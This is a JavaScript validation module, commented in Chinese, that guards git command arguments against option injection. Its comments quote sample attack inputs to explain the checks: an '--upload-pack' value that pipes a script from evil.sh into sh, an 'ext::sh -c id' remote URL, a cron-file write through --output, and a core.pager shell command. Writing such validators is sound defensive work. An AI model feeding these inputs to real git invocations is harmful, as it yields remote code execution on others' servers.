// Copyright 2026 xz333221
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// git 参数校验 —— 防止用户输入被 git 当成选项解析。
//
// 背景：execGitCommand 用 execFile 且不开 shell，所以不存在 shell 注入。
// 但 git 自身提供了一批"能执行命令"的选项，最典型的是 --upload-pack：
//
//   git push -u origin '--upload-pack=curl evil.sh|sh'   ← branch 是这个就能 RCE
//   git remote add origin 'ext::sh -c id'                ← url 也能
//   git show '--output=/etc/cron.d/x' HEAD               ← 写任意文件
//
// 根因是参数位置上的用户输入只做了"非空"检查，没做形状校验。
// 这里统一收口：所有进 execGitCommand 的 rev / pathspec 必须先过一遍。
//
// 设计取舍：分支名用**黑名单**而不是 ASCII 白名单 —— git 分支名允许 Unicode，
// 中文分支名是真实存在的使用场景，白名单会误伤。

import { HttpError } from './asyncRoute.js'

// git 在 refname 中禁止的字符：ASCII 控制字符、空格、~ ^ : ? * [ \
const ILLEGAL_REF_CHARS = /[\x00-\x1f\x7f\s~^:?*[\\]/

// 完整或缩写的 commit hash。下限取 4 是因为 git 允许 4 位以上的缩写。
const GIT_HASH_RE = /^[0-9a-fA-F]{4,40}$/

const MAX_LEN = 255

/**
 * 校验分支名 / tag 名 / 其他 ref 名。
 * 返回规范化后的字符串；不合法则抛 HttpError(400)。
 */
export function assertGitRef(value, label = '引用名') {
  const s = String(value ?? '').trim()
  if (!s) throw new HttpError(400, `缺少${label}`)
  // 以 - 开头会被 git 解析成选项，这是参数注入的入口
  if (s.startsWith('-')) throw new HttpError(400, `${label}不能以 - 开头`)
  if (ILLEGAL_REF_CHARS.test(s)) throw new HttpError(400, `${label}含有非法字符`)
  if (s.includes('..')) throw new HttpError(400, `${label}不能包含 ..`)
  if (s.startsWith('/') || s.endsWith('/') || s.includes('//')) {
    throw new HttpError(400, `${label}格式不合法`)
  }
  if (s.length > MAX_LEN) throw new HttpError(400, `${label}过长`)
  return s
}

/**
 * 校验 commit hash。只接受十六进制，不接受 HEAD~1 / branch 名等 rev 形式 ——
 * 调用方如果需要支持 ref，应当改用 assertGitRef。
 */
export function assertGitHash(value, label = '提交哈希') {
  const s = String(value ?? '').trim()
  if (!s) throw new HttpError(400, `缺少${label}`)
  if (!GIT_HASH_RE.test(s)) throw new HttpError(400, `${label}格式不合法`)
  return s
}

// git config 允许读写的 key 白名单。
//
// 为什么必须白名单：git config --global 的 key 完全不设限会带来两个洞
//   1. 读 http.https://github.com/.extraheader → 把 PAT 原样回给前端
//   2. 写 core.editor / core.pager / alias.* → 后续 git 操作会执行其中的命令
//      比如 core.pager='sh -c "id > /tmp/pwned" ;'，下一次 git log 就触发了
//
// 白名单只放纯数据型配置。alias.* 一律不收（git alias 会走 shell）。
// 有额外需求时用 ZEN_GIT_CONFIG_ALLOWED_KEYS 追加（逗号分隔）。
const DEFAULT_ALLOWED_GIT_CONFIG_KEYS = new Set([
  'user.name',
  'user.email',
  'core.autocrlf',
  'core.safecrlf',
  'core.quotepath',
  'core.ignorecase',
  'core.longpaths',
  'push.autoSetupRemote',
  'push.default',
  'pull.rebase',
  'fetch.prune',
  'init.defaultBranch'
])

function allowedGitConfigKeys() {
  const extra = String(process.env.ZEN_GIT_CONFIG_ALLOWED_KEYS || '')
    .split(',')
    .map((s) => s.trim())
    .filter(Boolean)
  if (extra.length === 0) return DEFAULT_ALLOWED_GIT_CONFIG_KEYS
  return new Set([...DEFAULT_ALLOWED_GIT_CONFIG_KEYS, ...extra])
}

/**
 * 校验 git config 的 key。只允许白名单内的项，其余一律 400。
 */
export function assertGitConfigKey(value, label = '配置项名称') {
  const s = String(value ?? '').trim()
  if (!s) throw new HttpError(400, `缺少${label}`)
  if (s.startsWith('-')) throw new HttpError(400, `${label}不能以 - 开头`)
  if (!allowedGitConfigKeys().has(s)) {
    throw new HttpError(400, `不允许读写的 git ${label}: ${s}`)
  }
  return s
}

/**
 * 校验 git config 的 value。
 *
 * 光有 key 白名单还不够：git config 写值时，值里若含换行，.gitconfig 里就会
 * 真的多出一行，等于能凭空塞进任意 key（core.pager 之类照样写进去），白名单
 * 直接被绕过。方括号同理，能拼出一个新的 section。
 */
export function assertGitConfigValue(value, label = '配置项取值') {
  const s = String(value ?? '').trim()
  // \x00-\x1f 覆盖 \n(0x0a) 与 \r(0x0d)，[] 用于防止伪造 section
  if (/[\x00-\x1f\x7f[\]]/.test(s)) {
    throw new HttpError(400, `${label}含有非法字符`)
  }
  return s
}

/**
 * 校验 remote URL。
 *
 * 除了 remote 名要过 assertGitRef，URL 本身也有两个坑：
 *   1. git 支持 `ext::` 传输协议，值是 shell 命令 —— `git remote add origin 'ext::sh -c id'`
 *      会在下次 fetch/pull 时执行它。
 *   2. 以 - 开头同样会被解析成选项。
 */
export function assertGitRemoteUrl(value, label = '远程仓库地址') {
  const s = String(value ?? '').trim()
  if (!s) throw new HttpError(400, `${label}不能为空`)
  if (s.startsWith('-')) throw new HttpError(400, `${label}不能以 - 开头`)
  // ext:: 后面跟的是要执行的命令，等于把 remote 配置变成 RCE
  if (/^ext::/i.test(s)) throw new HttpError(400, `不支持 ext:: 传输协议`)
  if (/[\x00-\x1f\x7f]/.test(s)) throw new HttpError(400, `${label}含有非法字符`)
  return s
}

/**
 * 校验仓库内的相对路径（用于 pathspec 和 `<rev>:<path>` 这类 spec）。
 * 拒绝绝对路径、盘符路径、UNC 路径与 .. 上跳。
 */
export function assertGitPath(value, label = '文件路径') {
  const s = String(value ?? '').trim()
  if (!s) throw new HttpError(400, `缺少${label}`)
  if (s.startsWith('-')) throw new HttpError(400, `${label}不能以 - 开头`)
  if (/[\x00-\x1f\x7f]/.test(s)) throw new HttpError(400, `${label}含有非法字符`)
  // 绝对路径 / Windows 盘符 / UNC —— 仓库内路径应当是相对形式
  if (s.startsWith('/') || /^[A-Za-z]:[\\/]/.test(s) || s.startsWith('\\\\')) {
    throw new HttpError(400, `${label}必须是仓库内的相对路径`)
  }
  if (s.split(/[\\/]/).includes('..')) throw new HttpError(400, `${label}不能包含 ..`)
  if (s.length > MAX_LEN * 4) throw new HttpError(400, `${label}过长`)
  return s
}
